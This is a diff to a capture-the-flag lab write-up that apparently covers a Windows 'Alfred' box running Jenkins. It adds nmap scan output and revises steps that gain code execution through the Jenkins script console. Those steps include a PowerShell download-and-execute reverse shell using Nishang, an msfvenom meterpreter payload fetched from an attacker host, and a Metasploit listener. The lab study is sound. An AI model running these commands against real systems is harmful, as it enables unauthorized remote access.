@@ -11,12 +11,58 @@
 First run a simple port scan (without Ping)
 
 	nmap -Pn -p- <IP address target machine> -oN portscan
+
+    # Nmap 7.92 scan initiated Thu Sep 29 17:51:07 2022 as: nmap -Pn -p- -oN portscan 10.10.184.145
+    Nmap scan report for 10.10.184.145
+    Host is up, received user-set (0.043s latency).
+    Scanned at 2022-09-29 17:51:07 BST for 112s
+    Not shown: 65532 filtered tcp ports (no-response)
+    PORT     STATE SERVICE       REASON
+    80/tcp   open  http          syn-ack ttl 127
+    3389/tcp open  ms-wbt-server syn-ack ttl 127
+    8080/tcp open  http-proxy    syn-ack ttl 127
+    
+    Read data files from: /usr/bin/../share/nmap
+    # Nmap done at Thu Sep 29 17:52:59 2022 -- 1 IP address (1 host up) scanned in 112.75 seconds
 	
 Three open ports: Two http (websites?) on port 80 and 8080, and a Remote Desktop service on port 3389.
 
-Run an all scan on the three open ports:
+Run an `-A` scan on the three open ports:
 
 	nmap -Pn -T4 -A -p80,3389,8080 <IP address target machine> -oN servicescan
+    
+    # Nmap 7.92 scan initiated Thu Sep 29 17:57:00 2022 as: nmap -Pn -T4 -A -p80,3389,8080 -oN servicescan 10.10.184.145
+    Nmap scan report for 10.10.184.145
+    Host is up (0.042s latency).
+    
+    PORT     STATE SERVICE    VERSION
+    80/tcp   open  http       Microsoft IIS httpd 7.5
+    | http-methods: 
+    |_  Potentially risky methods: TRACE
+    |_http-title: Site doesn't have a title (text/html).
+    |_http-server-header: Microsoft-IIS/7.5
+    3389/tcp open  tcpwrapped
+    | ssl-cert: Subject: commonName=alfred
+    | Not valid before: 2022-09-28T16:47:01
+    |_Not valid after:  2023-03-30T16:47:01
+    8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+    | http-robots.txt: 1 disallowed entry 
+    |_/
+    |_http-title: Site doesn't have a title (text/html;charset=utf-8).
+    |_http-server-header: Jetty(9.4.z-SNAPSHOT)
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    TRACEROUTE (using port 8080/tcp)
+    HOP RTT      ADDRESS
+    1   42.93 ms 10.9.0.1
+    2   43.62 ms 10.10.184.145
+    
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    # Nmap done at Thu Sep 29 17:57:34 2022 -- 1 IP address (1 host up) scanned in 35.11 seconds
 	
 A version for Microsoft IIS, a possible `robots.txt` on port 8080 and something called Jetty.
 
@@ -38,7 +84,7 @@ I'm already in.
 The Jenkins documentation gives me two possible ways of Remote Code Execution:
 
 1. Click "Project" to get into the prebuilt project, then click  "Configure" on the left. Scrolling down, there is a window that allows for executing Windows batch commands.
-2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage, go to Project Management, scroll down below the warnings, and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.
+2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage on the left, click on "Manage Jenkins", scroll down below the warnings, and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.
 
 A PowerShell command to execute a reverse shell might work. "Nishang" contains a lot of reverse shell payloads and more.
 
@@ -48,7 +94,7 @@ If on Kali, copy `Invoke-PowershellTcp.ps1` from `/usr/share/nishang/Shells`. If
 I decided not to copy and just host the entire Nishang Shells directory, by starting a server in 
 `/usr/share/nishang/Shells`:
 
-	python3 -m http.server 80
+	# python3 -m http.server 80
 
 Option 1: Execute windows batch command window
 
@@ -69,18 +115,18 @@ Testing remote command execution through the execute function, using "print" to 
 In the script console:
 
 ```text
-print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:<http-server port>/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>".execute().text
+print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>".execute().text
 ```
 Get the flag:
 
-	PS  C:\Users\bruce\Desktop> cat users.txt
+    PS C:\Program Files (x86)\Jenkins> cd ..\..\Users\bruce\Desktop
+	PS C:\Users\bruce\Desktop> cat users.txt
 
 ## Switching shells
 
 Generate payload:
 
-	msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=<Listen port on attack machine> -f exe -o shell.exe
-
+	# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=<Listen port on attack machine> -f exe -o shell.exe
 
 Set up a Python web server to host the reverse shell:
 
@@ -89,8 +135,7 @@ Set up a Python web server to host the reverse shell:
 Download the shell.exe into the Target machine using Jenkins:
 
 	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8888/shell.exe','shell.exe')"
-	
-	
+
 In a new terminal, start Metasploit, select the multi handler module, set the payload type, LHOST and LPORT options to match the payload shell, and run the listener:
 
 	# msfconsole -q
@@ -100,8 +145,8 @@ In a new terminal, start Metasploit, select the multi handler module, set the pa
 	msf6 exploit(multi/handler) > set LPORT <Listen port on attack machine>
 	msf6 exploit(multi/handler) > run
 	
-In the powershell terminal, executing the reverse shell using the Powershell `Start-Process` cmdlet:
-	
-	PS  C:\Users\bruce\Desktop> Start-Process "shell.exe"
+In the powershell terminal, execute the reverse shell using the Powershell `Start-Process` cmdlet:
+
+	PS C:\Users\bruce\Desktop> Start-Process "shell.exe"
 
 ## Privilege escalation
